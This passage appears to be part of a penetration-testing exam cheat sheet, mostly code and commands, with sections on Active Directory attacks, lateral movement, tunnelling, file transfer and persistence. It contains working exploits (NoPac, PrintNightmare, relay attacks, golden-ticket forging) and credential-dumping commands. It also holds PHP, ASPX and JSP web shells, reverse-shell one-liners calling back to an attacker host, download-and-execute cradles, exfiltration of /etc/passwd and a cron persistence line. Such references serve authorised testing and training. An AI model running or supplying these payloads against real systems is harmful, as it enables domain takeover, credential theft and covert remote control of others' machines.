ldapsearch -x -H ldap://<dc-ip> -D '<u>@<dom>' -w '<p>' \
  -b "DC=<d>,DC=<t>" "(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))" \
  ms-Mcs-AdmPwd dnshostname
```
```powershell
# Windows
Get-DomainObject -Identity <pc-name> -Properties ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName <pc-name>
```

#### gMSA passwords (msDS-ManagedPassword)

Prereq: your account is in `PrincipalsAllowedToRetrieveManagedPassword`.
```bash
# Linux
nxc ldap <dc-ip> -u '<u>' -p '<p>' --gmsa
# Or
python3 gMSADumper.py -u '<u>' -p '<p>' -d <dom> -l <dc-ip>
```
```powershell
# Windows (DSInternals)
$gmsa = Get-ADServiceAccount -Identity <gmsa-name> -Properties msDS-ManagedPassword
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp     # gives you NTLM
```

#### Snaffler — automated SMB share secret hunting (Windows)

```cmd
.\Snaffler.exe -s -o snaffler.log
.\Snaffler.exe -d <dom> -s -v data -o snaffler.log
```
- Reads the Black/Grey/Yellow/Red rules and flags everything from passwords-in-config to encryption keys.

#### Living-Off-The-Land enumeration (no extra tools)

```cmd
:: Quick AD recon with built-ins
net view /domain
net view \\<dc>\
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Schema Admins" /domain
net group "DnsAdmins" /domain
net localgroup administrators /domain

:: Detailed via dsquery
dsquery user "DC=<d>,DC=<t>" -limit 0
dsquery group "DC=<d>,DC=<t>" -limit 0
dsquery * -filter "(servicePrincipalName=*)" -attr samaccountname servicePrincipalName

:: WMI
wmic /node:<host> /user:<dom>\<u> /password:<p> computersystem list brief
wmic /node:<host> useraccount get
wmic /node:<host> process call create "cmd /c whoami > C:\Windows\Temp\out.txt"
```

#### Bleeding-Edge AD CVEs

##### NoPac (CVE-2021-42278 + CVE-2021-42287, samAccountName Spoofing)
Prereq: any domain user (no privileges needed).
```bash
# Detect
python3 noPac.py scan -dc-ip <dc-ip> -d <dom> -u <u> -p '<p>'
# Exploit (full DC compromise)
python3 noPac.py <dom>/<u>:'<p>' -dc-ip <dc-ip> -dc-host <dc-host> --impersonate administrator -use-ldap -shell
# Or get hashes
python3 noPac.py <dom>/<u>:'<p>' -dc-ip <dc-ip> -dc-host <dc-host> --impersonate administrator -dump
```

##### PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

Prereq: any domain user; target host has Print Spooler service running.
```bash
# Linux
git clone https://github.com/cube0x0/CVE-2021-1675
python3 CVE-2021-1675.py <dom>/<u>:'<p>'@<target-ip> '\\<attacker-ip>\share\addCube.dll'
# Or impacket version (requires patched Impacket cube0x0/impacket)
```
```powershell
# Windows
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -DriverName "PrintMe" -NewUser "hacker" -NewPassword "P@ssw0rd!"
```

##### PrinterBug (MS-RPRN, the original coercion)

Prereq: any domain user. Coerces target to authenticate to attacker via SMB. Combine with relay (ESC8/SMB→LDAP).
```bash
git clone https://github.com/dirkjanm/krbrelayx
python3 printerbug.py <dom>/<u>:'<p>'@<target> <attacker-ip>
```

##### PetitPotam (MS-EFSRPC) — see ESC8 in §7.3 above

##### MS14-068 (legacy, but useful on unpatched DCs)
Allows any domain user → DA via crafted PAC.
```bash
impacket-goldenPac <dom>/<u>:'<p>'@<target>
# Outputs SYSTEM shell. Test only on Server 2008/2012.
```

#### Enterprise / Modern AD Attacks

**SCCM (System Center Configuration Manager):**
```bash
# Discovery:
nxc smb <cidr> -M sccm
SharpSCCM.exe find -t sccm                    # enumerate SCCM components

# NAA (Network Access Account) credential extraction:
# NAA creds stored encrypted in SCCM, often DA-equivalent, readable from any domain host
SharpSCCM.exe get naa                          # extract NAA creds from client policy
# Linux alternative via impacket:
python3 sccmwtf.py naa -t <sccm-host> -u '<u>' -p '<p>'

# SCCM relay (HTTP → MSSQL site server):
# If you can coerce SCCM site server to auth, relay to MSSQL for xp_cmdshell
sudo impacket-ntlmrelayx -t mssql://<sccm-db-host> --query "EXEC xp_cmdshell 'whoami'"
# Tools: SharpSCCM, sccmwtf, MalSCCM
```

**ADIDNS (AD-Integrated DNS) Wildcard Injection:**
```bash
# Any authenticated user can create DNS records by default
# Add wildcard to capture auth from all internal names:
Invoke-DNSUpdate -DnsName '*' -DnsData <attacker-ip>             # Powermad
python3 dnstool.py -u '<dom>\<u>' -p '<p>' -r '*' -d <attacker-ip> -a add -t A <dc-ip>

# Combined with Responder:
sudo responder -I eth0 -A                     # passive mode first to observe
# Once wildcard added, all WPAD/unconfigured queries → your IP → NTLM capture
sudo responder -I eth0                        # active poisoning
```

**KrbRelayUp — Local UAC Bypass (domain-joined workstation):**
```bash
# No privs needed except domain user on local machine
# Attacks: RBCD self-attack via Kerberos relay (no NTLM needed)
KrbRelayUp.exe relay -m shadowcred -p 12345  # shadowcredentials mode
KrbRelayUp.exe relay -m rbcd -p 12345        # RBCD mode (if shadowcred fails)
# Outputs SYSTEM shell on local machine
```

**RBCD (Resource-Based Constrained Delegation) Self-Attack:**
```bash
# Prereq: GenericAll / GenericWrite / WriteProperty on a computer object
# Step 1: Create a new machine account (if MachineAccountQuota > 0):
impacket-addcomputer <dom>/<u>:'<p>' -computer-name 'ATTACK$' -computer-pass 'P@ssw0rd1'

# Step 2: Write msDS-AllowedToActOnBehalfOfOtherIdentity on target computer:
impacket-rbcd -u '<u>' -p '<p>' -t <target-computer>$ -f 'ATTACK$' <dom>

# Step 3: Get service ticket via S4U2Self+S4U2Proxy:
impacket-getST -spn 'cifs/<target-fqdn>' -impersonate administrator <dom>/'ATTACK$':'P@ssw0rd1'
export KRB5CCNAME=$(pwd)/administrator@cifs_<target-fqdn>@<DOM>.ccache

# Step 4: Use ticket:
impacket-psexec -k -no-pass <dom>/administrator@<target-fqdn>
```

**WSUS Abuse:**
```bash
# If you can MITM or control WSUS traffic (HTTP not HTTPS):
# PyWSUS injects malicious update package
git clone https://github.com/GoSecure/pywsus && cd pywsus
sudo python3 pywsus.py -H <attacker-ip> -p 8530 -e PsExec64.exe -c "net localgroup administrators <u> /add"
# Then ARP spoof or DNS poison WSUS hostname → clients pull malicious update
```

#### PrivExchange (CVE-2019-0686) — when Exchange is in scope

Coerces Exchange to authenticate to attacker → relay to LDAP → grant DCSync on user.
```bash
# 1) Listener relays to LDAP, escalating attacker user
sudo impacket-ntlmrelayx -t ldap://<dc> --escalate-user <our-user>
# 2) Coerce Exchange
python3 privexchange.py -ah <attacker-ip> -ap /privexchange/ <exchange-host>
# 3) After relay → secretsdump as our user (now has DCSync)
impacket-secretsdump <dom>/<our-user>:'<p>'@<dc>
```

#### Sniffing LDAP credentials with mitm6 + ntlmrelayx

```bash
# Terminal 1 — relay
sudo impacket-ntlmrelayx -6 -t ldaps://<dc> -wh fakewpad.<dom> -l loot/
# Terminal 2 — IPv6 DNS poison
sudo mitm6 -d <dom>
# Then wait for Windows hosts to renew DHCPv6 → they treat attacker as DNS → relay fires
```

#### PASSWD_NOTREQD enumeration (look for blank-password accounts)

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
```bash
# Linux
ldapsearch ... '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))' samaccountname
# Try blank password against each
for u in $(cat passwd_notreqd.txt); do nxc smb <dc-ip> -u "$u" -p ''; done
```

#### Group Policy Preferences (GPP) cpassword

```bash
# Find Groups.xml / Services.xml / ScheduledTasks.xml etc on SYSVOL
smbclient -U '<u>%<p>' //<dc>/SYSVOL -c 'recurse;prompt;mget *'
grep -r "cpassword" SYSVOL/ | grep -v 'cpassword=""'
gpp-decrypt 'VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE'
# Or via NetExec modules
nxc smb <dc-ip> -u '<u>' -p '<p>' -M gpp_password
nxc smb <dc-ip> -u '<u>' -p '<p>' -M gpp_autologin     # Registry.xml autologon
```

#### Group Policy Object (GPO) Abuse

Prereqs (any of):
- `GenericAll` / `WriteProperty` / `WriteDACL` on a GPO object via ACL.
- Discoverable in BloodHound: edges `GenericAll`, `GenericWrite`, `WriteOwner`, `WriteDacl` to a GPO.

```powershell
# Find writeable GPOs
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq (Convert-NameToSid "<your-group>")} | select ObjectDN,ActiveDirectoryRights
# OR
Get-NetGPO | %{ Get-ObjectAcl -ResolveGUIDs -Name $_.Name }
```
Abuse — add immediate scheduled task / new local admin user via SharpGPOAbuse:
```cmd
SharpGPOAbuse.exe --AddComputerTask --TaskName "Backup" --Author "DOMAIN\admin" --Command "cmd.exe" --Arguments "/c net user pwn P@ssw0rd /add && net localgroup administrators pwn /add" --GPOName "VulnerableGPO"
```
Then force GPO update on target: `gpupdate /force` (or wait 90+/-30 min).

#### Kerberos Double-Hop Problem & Workarounds

Symptom: WinRM into Box A as user X, try to access Box B as user X → access denied. Reason: WinRM uses NTLM by default; X's credentials don't propagate to second hop.

- **Workaround #1**: Pass a `PSCredential` object explicitly:
  ```powershell
  $pass = ConvertTo-SecureString '<password>' -AsPlainText -Force
  $cred = New-Object System.Management.Automation.PSCredential('<dom>\<user>', $pass)
  Invoke-Command -ComputerName <box-b> -Credential $cred -ScriptBlock { whoami }
  ```
- **Workaround #2**: Register a CredSSP-enabled PSSession config:
  ```powershell
  Enable-WSManCredSSP -Role Server -Force                            # on hop-1
  Set-Item WSMan:\localhost\Service\Auth\CredSSP -Value $true        # on hop-1
  # From attacker
  Enter-PSSession -ComputerName <box-a> -Authentication CredSSP -Credential $cred
  ```
- **Workaround #3** (best): Use Kerberos / S4U or the user's TGT (export with Rubeus) and PtT to box A, where Kerberos delegation lets you hit box B natively.

#### Trust enumeration (always check)

```powershell
Get-DomainTrust
Get-DomainTrustMapping                                      # multi-hop
Get-ADTrust -Filter *
nltest /domain_trusts /all_trusts
```
```bash
nxc ldap <dc-ip> -u '<u>' -p '<p>' --trusted-for-delegation
bloodhound-python -c Trusts -d <dom> -u <u> -p '<p>' -ns <dc-ip>
```

#### Domain Trust Attacks

##### Child → Parent (ExtraSIDs / SID History injection)

Prereq: DA (or equivalent) on a child domain.
```bash
# 1) Enumerate child domain SID + parent SID
impacket-lookupsid <child-dom>/<DA>:'<p>'@<child-dc> 0
# 2) Get krbtgt of child
impacket-secretsdump -just-dc-user 'krbtgt' <child-dom>/<DA>:'<p>'@<child-dc>
# 3) Forge golden ticket with parent Enterprise Admins SID in ExtraSids
impacket-ticketer -nthash <child-krbtgt-NTLM> \
  -domain-sid <child-domain-SID> \
  -domain <child-dom> \
  -extra-sid <parent-S-1-5-21-...-519>          # Enterprise Admins SID
  Administrator
# 4) Use ticket to access parent DC
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass <child-dom>/Administrator@<parent-dc-fqdn>
```
- One-shot: `impacket-raiseChild <child-dom>/<DA>:'<p>'`.

```cmd
:: Mimikatz equivalent
mimikatz # lsadump::dcsync /domain:<child-dom> /user:<child-dom>\krbtgt
mimikatz # kerberos::golden /user:Administrator /domain:<child-dom> /sid:<child-SID> /sids:<parent-EA-SID> /krbtgt:<child-krbtgt-NTLM> /ptt
```

```cmd
:: Rubeus equivalent
Rubeus.exe golden /user:Administrator /domain:<child-dom> /sid:<child-SID> /sids:<parent-EA-SID> /krbtgt:<child-krbtgt-NTLM> /ptt
```

##### Cross-Forest Trust Abuse

```bash
# 1) Cross-forest Kerberoast (request TGS for SPNs in trusted forest)
impacket-GetUserSPNs -target-domain <other-dom> <our-dom>/<u>:'<p>' -dc-ip <our-dc>
# 2) Foreign group membership
Find-ForeignGroup -Verbose                                     # PowerView
Find-ForeignUser -Verbose
# 3) SID History abuse — only if both sides allow filtering bypass; mostly defunct on modern forests
```

#### General trust-attack decision

```
IF you have DA on a child:
  → Check if forest root = same forest → use ExtraSIDs/raiseChild → Enterprise Admin
IF separate forest with bidirectional trust:
  → Cross-forest Kerberoast → Foreign group membership in BloodHound → ACL across trust
IF SID Filtering disabled (rare on modern):
  → SID History injection
```

#### Fallback — Domain trust attacks (legacy summary)

> ✅ **GATE — End of §7 (Active Directory)**: Must have:
> - [ ] BloodHound data collected and attack paths reviewed
> - [ ] At least one domain account compromised (or domain admin)
> - [ ] Kerberoastable / AS-REP roastable accounts checked
> - [ ] ADCS checked (`certipy find`)
> - [ ] Trust relationships enumerated
> - [ ] All DA/EA/high-priv hashes in `credentials.txt`

---

## 8. Lateral Movement

Decision based on what you have:

```
┌─────────────────────────────────────────────────────────────┐
│                Credential / Hash / Ticket                    │
└──────────────┬───────────────────────┬──────────────────────┘
               │                       │
        ┌──────▼──────┐         ┌──────▼──────┐
        │   On Linux   │         │  On Windows  │
        │  attacker    │         │   beachhead   │
        └──────┬──────┘         └──────┬──────┘
               │                       │
               ▼                       ▼
   Use Impacket / nxc /         Use Mimikatz / Rubeus /
   evil-winrm                   PowerView / runas / wmic
```

| You have | Target service | Tool | One-liner |
| --- | --- | --- | --- |
| User+pass | SMB | psexec / wmiexec / smbexec | `impacket-psexec <dom>/<u>:'<p>'@<ip>` |
| User+pass | WinRM | evil-winrm | `evil-winrm -i <ip> -u <u> -p '<p>'` |
| NTLM hash | SMB | psexec / wmiexec | `impacket-psexec <dom>/<u>@<ip> -hashes :<NTLM>` |
| NTLM hash | WinRM | evil-winrm | `evil-winrm -i <ip> -u <u> -H <NTLM>` |
| NTLM hash | RDP (RestrictedAdmin) | xfreerdp | `xfreerdp /v:<ip> /u:<u> /pth:<NTLM>` |
| Kerb ticket (.ccache) | Anything | impacket -k -no-pass | `KRB5CCNAME=t.ccache impacket-psexec -k -no-pass <dom>/<u>@<host>.<dom>` |
| AES key | Anything (Overpass) | getTGT -aesKey | `impacket-getTGT ... -aesKey <key>` |
| Plaintext + WinRM closed | DCOM | dcomexec.py | `impacket-dcomexec <dom>/<u>:'<p>'@<ip>` |
| MSSQL admin | Linked-server target | mssqlclient | `EXECUTE('xp_cmdshell ''whoami''') AT [LINKED]` |
| SSH key/pass | Linux | ssh | `ssh -i k <u>@<ip>` |
| Nothing direct | — | Pivot (§9) | — |

Caveats:
- `psexec.py` — drops a service binary on `ADMIN$`. AV-trippy. SYSTEM shell, full TTY.
- `wmiexec.py` — quietest, no service, no binary. No PTY (semi-interactive).
- `smbexec.py` — uses cmd `/Q /c` via service; no binary on disk; very flaky output redirection.
- `dcomexec.py` — when WMI is filtered. Uses ShellWindows / MMC20.
- `atexec.py` — schedules a task; only useful for one-off command exec.
- All Kerberos commands require: target reached via FQDN, /etc/hosts has DC, /etc/krb5.conf has realm & KDC.

Sample krb5.conf:
```ini
[libdefaults]
  default_realm = INLANEFREIGHT.LOCAL
  dns_lookup_kdc = false
[realms]
  INLANEFREIGHT.LOCAL = { kdc = dc01.inlanefreight.local }
[domain_realm]
  .inlanefreight.local = INLANEFREIGHT.LOCAL
  inlanefreight.local = INLANEFREIGHT.LOCAL
```

---

## 9. Pivoting & Tunneling

Always start by mapping: **What's my network?**
```bash
# On the foothold
ip a; ip r; cat /etc/resolv.conf
arp -a
# What CIDRs can the foothold see that I cannot?
```

### 9.0 proxychains4 Configuration

**Minimal exam config (`/etc/proxychains4.conf`):**
```ini
# Chain modes:
#   strict_chain   — use proxies in declared order, all must respond (correct for multi-hop)
#   dynamic_chain  — skip dead proxies (good for unstable tunnels)
#   random_chain   — random order (useless for multi-hop)
strict_chain

proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# Single hop (Chisel/SSH SOCKS5):
socks5  127.0.0.1  1080

# Multi-hop (add second tunnel in order):
# socks5  127.0.0.1  1080   # tunnel 1 (outer — your machine → pivot 1)
# socks5  127.0.0.1  1081   # tunnel 2 (inner — pivot 1 → pivot 2)
# strict_chain enforces this order: each connection traverses both proxies in sequence
```

**Usage:**
```bash
proxychains4 -q nmap -sT -Pn -p 22,80,443,445,3389 <internal-ip>
proxychains4 -q impacket-psexec <dom>/<u>:'<p>'@<internal-ip>
proxychains4 -q evil-winrm -i <internal-ip> -u <u> -p '<p>'
proxychains4 -q curl http://<internal-ip>/
```

> `dynamic_chain` vs `strict_chain`: use `dynamic_chain` for a single unstable tunnel; use `strict_chain` when you have an ordered multi-hop chain where each proxy must be used.

### 9.1 Single-hop SSH forwarding

- **Local port forward** — `attacker:9200 → pivot → internal:9200`:
  ```bash
  ssh -L 9200:internal.host:9200 user@pivot
  # Now hit http://127.0.0.1:9200 from attacker
  ```
- **Remote port forward** — open a port on pivot back to attacker (reverse-shell catcher):
  ```bash
  ssh -R 4444:127.0.0.1:4444 user@pivot
  # Anything connecting to pivot:4444 hits attacker:4444
  ```
- **Dynamic (SOCKS)** — full network access via SOCKS:
  ```bash
  ssh -D 1080 user@pivot
  # /etc/proxychains4.conf → socks5 127.0.0.1 1080
  proxychains4 -q nmap -sT -Pn -p- 10.10.10.0/24
  proxychains4 -q impacket-psexec <dom>/<u>:'<p>'@<internal-ip>
  ```

### 9.2 sshuttle (when SSH access exists, no proxychains needed)

```bash
sshuttle -r user@pivot 10.10.10.0/24 --dns
# Now your routing transparently routes 10.10.10.0/24 through pivot via SSH
```

### 9.3 Chisel (when SSH not available — most common alt in the notes)

Attacker (server):
```bash
chisel server -p 8888 --reverse
```
Compromised pivot (client) — connect back, expose SOCKS:
```bash
# Linux pivot
./chisel client <attacker-ip>:8888 R:1080:socks
# Windows pivot
chisel.exe client <attacker-ip>:8888 R:1080:socks
```
Then attacker uses `127.0.0.1:1080` as SOCKS5 proxy:
```bash
# /etc/proxychains4.conf
socks5 127.0.0.1 1080
proxychains4 nmap -sT -Pn 10.10.10.0/24
```
- IF you only need a single port instead of a full SOCKS:
  ```bash
  # Forward attacker:445 → through pivot → 10.10.10.5:445
  ./chisel client <attacker-ip>:8888 R:445:10.10.10.5:445
  ```

### 9.4 Ligolo-ng (modern alternative — exam-style supplement)

> Note: not covered in the source notes; included because the user asked for it. The notes drill **Chisel**, **sshuttle**, **dnscat2**, **ptunnel-ng**, **rpivot**, **socat**, **plink**, **SocksOverRDP**.

Attacker (proxy):
```bash
# 1) Create TUN interface (only once per session)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# 2) Run proxy listener
./proxy -selfcert -laddr 0.0.0.0:11601
```
Pivot (agent — from the foothold):
```bash
./agent -connect <attacker-ip>:11601 -ignore-cert
```
Back on attacker:
```text
ligolo » session              # pick agent
[agent] » ifconfig            # see agent's networks
# Add a route on attacker for the internal CIDR
sudo ip route add 10.10.10.0/24 dev ligolo
[agent] » start                # forwards traffic
```
Now you can hit `10.10.10.0/24` natively (nmap, smbclient, evil-winrm — no proxychains).

Listener for reverse shells through tunnel (AKA pivoting a callback):
```text
[agent] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# Now reverse shells from internal hosts to <pivot-ip>:4444 land on attacker:4444
```

Common gotcha — **stale TUN**:
```bash
sudo ip tuntap del ligolo mode tun
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

> ⚠️ **proxychains + nmap**: Only TCP connect scan (`-sT`) works through SOCKS proxy. `-sS` (SYN), `-sU` (UDP), and `-sn` (ping sweep) are silently broken through proxychains. Always use:
> ```bash
> proxychains4 nmap -sT -Pn --open -p21,22,80,135,139,443,445,3389,5985 <internal-ip>
> ```

> 🔄 **LOOP — Tunnel/Pivot established**:
> → Discover the new network segment: `ip a; ip r; arp -a` on pivot host
> → Add new CIDR to ligolo routing: `sudo ip route add <new-cidr>/24 dev ligolo`
> → **Return to §2.1 Nmap from scratch on ALL new hosts** (host discovery + service scan)
> → **Return to §2.2 service enum** for each open port on new hosts
> → **Return to §7.1 AD enum** if DC/domain discovered on new segment

### 9.5 Multi-hop (deep network)

- **Ligolo-ng nested**: from agent #1, pivot to host #2, run a second `agent` connecting back to a second proxy listener on attacker.
  ```bash
  # Step 1: On attacker — open a second listener
  ./proxy -selfcert -laddr 0.0.0.0:11602
  # Step 2: On pivot1 (via existing tunnel), upload and run agent toward attacker:11602
  ./agent -connect <attacker-ip>:11602 -ignore-cert
  # Step 3: On attacker — select tunnel #2, add new route
  sudo ip route add <net2-cidr>/24 dev ligolo
  ```
- **Chisel chained**:
  ```bash
  # Pivot1 is already a SOCKS proxy on attacker:1080
  # On pivot1: run another chisel client connecting to attacker:8001 via pivot1's chisel
  proxychains4 chisel client <attacker>:8001 R:1081:socks
  # attacker: separate chisel server on port 8001
  chisel server --port 8001 --reverse
  # proxychains config for net2: use 127.0.0.1:1081
  ```
- **SSH chained**: `ssh -J jump1,jump2 user@deepest`.

### 9.6 Windows-only pivots

- **Plink** (PuTTY's CLI ssh) for SSH from Windows pivot:
  ```cmd
  plink.exe -ssh -l user -pw 'pass' -R 8080:127.0.0.1:80 <attacker>
  plink.exe -ssh -D 1080 -N user@<attacker>             :: dynamic
  ```
- **Netsh portproxy** (no admin? requires admin):
  ```cmd
  netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.5
  netsh interface portproxy show all
  netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
  netsh advfirewall firewall add rule name="fwd" dir=in action=allow protocol=TCP localport=8080
  ```
- **SocksOverRDP** — when you have RDP only:
  ```text
  Connect with mstsc → load SocksOverRDP-Plugin.dll → SOCKS exposed to attacker via virtual channel
  ```

### 9.7 DNS / ICMP egress (when TCP/UDP outbound is filtered)

- **dnscat2** — DNS C2:
  ```bash
  # Server
  ruby dnscat2.rb <subdomain.controlled-by-you>
  # Client (Windows)
  dnscat2-client.exe <subdomain.controlled-by-you>
  ```
- **ptunnel-ng** — ICMP tunnel:
  ```bash
  # Proxy
  sudo ptunnel-ng -r0.0.0.0
  # Client → tunnels TCP over ICMP echo-request/reply
  sudo ptunnel-ng -p<proxy-ip> -lp 2222 -da <internal> -dp 22
  ssh -p 2222 user@127.0.0.1
  ```

### 9.8 Metasploit pivoting

```text
meterpreter > run autoroute -s 10.10.10.0/24
msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 1080 ; set VERSION 5 ; run -j
# proxychains then targets the meterpreter route
```

### 9.9 Decision summary

| Constraint | Use |
| --- | --- |
| Pivot has SSH access | sshuttle (cleanest) or `ssh -D` |
| No SSH, can run binary, outbound TCP allowed | Chisel reverse SOCKS |
| Modern engagement, want native routing | Ligolo-ng |
| Outbound TCP blocked, ICMP allowed | ptunnel-ng |
| Outbound TCP/ICMP blocked, DNS works | dnscat2 |
| Already in Meterpreter | autoroute + socks_proxy |
| Only RDP available | SocksOverRDP |
| Need single-port forward, not full SOCKS | netsh portproxy / chisel client R:445:host:445 |

---

## 10. File Transfers, Web Shells, Persistence

### 10.1 Linux ↔ Linux

```bash
# Attacker hosts
python3 -m http.server 80
# OR
sudo updog                  # multi-feature

# Target downloads
wget http://<attacker>/file -O /tmp/file
curl -o /tmp/file http://<attacker>/file
# /dev/tcp fileless
exec 3<>/dev/tcp/<attacker>/80; printf 'GET /file HTTP/1.0\r\n\r\n' >&3; cat <&3 > /tmp/file

# Upload to attacker
curl -F 'f=@/etc/passwd' http://<attacker>:9999/upload     # if updog upload enabled
scp /etc/passwd user@<attacker>:/tmp/
```

### 10.2 Linux → Windows (download)

```cmd
:: PowerShell (most common)
powershell -ep bypass -c "iwr http://<attacker>/nc.exe -o C:\Temp\nc.exe"
powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('http://<attacker>/nc.exe','C:\Temp\nc.exe')"
:: Fileless execution
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/PowerView.ps1')"
:: certutil (LOLBin, often unblocked)
certutil -urlcache -split -f http://<attacker>/nc.exe C:\Temp\nc.exe
:: bitsadmin
bitsadmin /transfer myJob /priority normal http://<attacker>/nc.exe C:\Temp\nc.exe
:: SMB share
:: attacker: impacket-smbserver share /home/k/share -smb2support -username u -password p
net use Z: \\<attacker>\share /user:u p
copy Z:\nc.exe C:\Temp\nc.exe
```

### 10.3 Windows → Linux (upload)

```cmd
:: SMB
:: attacker: impacket-smbserver share /home/k/share -smb2support
copy C:\Loot\file Z:\
:: PowerShell to attacker's Python uploader (needs receiver server)
powershell -c "Invoke-RestMethod -Uri http://<attacker>:9999/upload -Method Post -InFile C:\Loot\f -ContentType 'application/octet-stream'"
:: Note: Invoke-RestMethod -InFile requires PS 3.0+. On Windows 7/2008 (PS 2.0) use:
:: powershell -c "(New-Object System.Net.WebClient).UploadFile('http://<attacker>:9999/upload','C:\Loot\f')"
:: certutil base64 → paste
certutil -encode C:\file file.b64
type file.b64                              :: copy/paste into terminal → base64 -d
```

### 10.4 Base64 round-trip (for tiny binaries / when stuck)

```bash
# attacker
base64 -w0 nc > nc.b64
```
```cmd
:: target Windows
[IO.File]::WriteAllBytes('C:\Temp\nc.exe',[Convert]::FromBase64String('<paste blob>'))
```

### 10.5 LOLBAS top-5 for downloads

| Binary | Command |
| --- | --- |
| certutil | `certutil -urlcache -split -f <url> <dest>` |
| bitsadmin | `bitsadmin /transfer j /priority normal <url> <dest>` |
| msiexec | `msiexec /q /i http://<attacker>/x.msi` |
| mshta | `mshta http://<attacker>/payload.hta` |
| regsvr32 | `regsvr32 /s /n /u /i:http://<attacker>/x.sct scrobj.dll` |

### 10.6 Web shells

```php
<?php // PHP one-liner
if(isset($_REQUEST['c'])){system($_REQUEST['c']);}
// Or full
<?php system($_GET['c']); ?>
```

```aspx
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]); %>
```

```jsp
<%@ page import="java.util.*,java.io.*"%>
<% if (request.getParameter("c") != null) {
  Process p = Runtime.getRuntime().exec(request.getParameter("c"));
  BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String l; while((l=r.readLine())!=null) out.println(l);
} %>
```

Promote a webshell to a reverse shell:
```bash
# Linux target
curl 'http://<host>/sh.php?c=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/<lhost>/4444%200%3E%261%22'
# Windows target (PowerShell)
curl 'http://<host>/sh.aspx?c=powershell%20-e%20<base64-revshell>'
```


#### 10.6.1 Extended Web Shell Library

```php
<?php @eval($_REQUEST['c']); ?>

<?php
if(isset($_GET['c'])) { echo "<pre>".shell_exec($_GET['c'])."</pre>"; }
?>
```

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    string c = Request["c"];
    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe","/c "+c);
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");
%>
```

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
    if (request.getParameter("c") != null) {
        Process p = Runtime.getRuntime().exec(request.getParameter("c"));
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String l; while((l=r.readLine())!=null) out.println(l);
    }
%>
```

Pre-built helpers:
- **/usr/share/laudanum** (Kali) — PHP/ASP/JSP webshell collection.
- **Antak** (`/usr/share/webshells/aspx/Antak.aspx`) — full ASPX webshell.
- **WSO** (PHP webshell with file manager).
- **p0wnyshell** (single-file PHP, terminal-emulating).

---

### 10.7 Reverse-shell payload templates

```bash
# Linux /bin/bash
bash -c 'bash -i >& /dev/tcp/<lhost>/4444 0>&1'

# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<lhost>",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'

# PowerShell (base64-encoded with msfvenom or):
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<lhost>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$x=(iex $d 2>&1 | Out-String);$x2=$x+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($x2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# msfvenom — Windows shell_reverse_tcp x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=4444 -f exe -o sh.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lhost> LPORT=443 -f exe -o sh.exe
```

Catcher:
```bash
sudo nc -lvnp 4444
# Or pwncat-cs (auto-upgrades the TTY)
pwncat-cs -lp 4444
# Or rlwrap'd nc
rlwrap nc -lvnp 4444
```

Stabilise a Linux reverse shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
export TERM=xterm-256color
stty rows 50 cols 200
```


#### 10.7.1 Bind vs. Reverse Shell Decision

| Network condition | Best option |
| --- | --- |
| Target can reach attacker (default) | Reverse shell |
| Target is behind NAT, attacker not | Reverse shell |
| Target has firewall blocking outbound | Bind shell (if inbound to high port allowed) |
| Both behind NAT | Pivot first / catch via SOCKS |
| Egress-only HTTPS / 443 | Reverse over HTTPS (meterpreter reverse_https on 443) |
| Outbound DNS only | dnscat2 / DNS exfil |
| Outbound ICMP only | ptunnel-ng |

```bash
# Bind shell (Linux)
nc -lvnp 4444 -e /bin/bash                   # legacy nc, often blocked
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Reverse shell catcher (Linux)
sudo nc -lvnp 4444
pwncat-cs -lp 4444                            # auto TTY upgrade + tools
```

---

### 10.8 Persistence (only if exam scope explicitly allows; otherwise note as POC)

Linux:
```bash
# Cron
echo "* * * * * /tmp/.s.sh" >> /etc/crontab
# .bashrc
